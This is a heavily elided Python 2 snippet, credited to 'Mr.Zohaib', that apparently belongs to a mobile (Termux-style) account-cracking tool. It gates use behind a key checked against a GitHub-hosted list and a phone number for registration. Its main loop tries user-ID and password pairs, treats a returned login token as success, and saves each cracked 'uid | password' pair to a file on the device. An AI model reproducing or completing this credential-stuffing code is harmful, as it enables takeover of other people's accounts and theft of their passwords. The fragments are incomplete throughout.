...
__author__ = 'Mr.Zohaib'
__copyright = 'All rights reserved . Copyright  Mr.Zohaib'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Zohaib255/Coder55/main/server.txt').text
    if to in r:
...
def reg2():
    ...
    print ''
    print ' \033[1;92mCopy and press enter , And Send Me On +923117582288'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'loc' in q:
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;92m[Zoh-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/HOP_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
